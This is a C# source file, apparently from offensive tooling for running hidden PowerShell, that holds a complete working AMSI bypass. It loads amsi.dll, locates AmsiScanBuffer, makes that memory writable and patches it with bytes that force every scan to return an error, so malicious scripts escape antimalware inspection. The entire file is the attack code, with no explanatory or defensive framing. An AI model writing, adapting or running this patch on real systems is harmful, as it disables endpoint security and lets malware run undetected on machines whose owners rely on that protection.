using System;
using System.Runtime.InteropServices;

namespace HiddenPowerShellDll
{
    class HiddePowerShellDllAmsiMemPatch
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int runBypass()
        {
            try
            {
                IntPtr TargetDLL = LoadLibrary("amsi.dll");
                if (TargetDLL == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Amsi bypass error");
                    return 1;
                }

                IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
                if (ASBPtr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Amsi bypass error");
                    return 1;
                }

                UIntPtr dwSize = (UIntPtr)5;
                uint Zero = 0;
                if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero))
                {
                    Console.WriteLine("[-] Amsi bypass error");
                    return 1;
                }

                Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
                Marshal.Copy(Patch, 0, unmanagedPointer, 6);
                MoveMemory(ASBPtr, unmanagedPointer, 6);

                Console.WriteLine("[+] Amsi bypass executed");
                return 0;

            }catch(Exception e)
            {
                Console.WriteLine("[-] Amsi bypass error");
                return 1;
            }
        }
    }
}
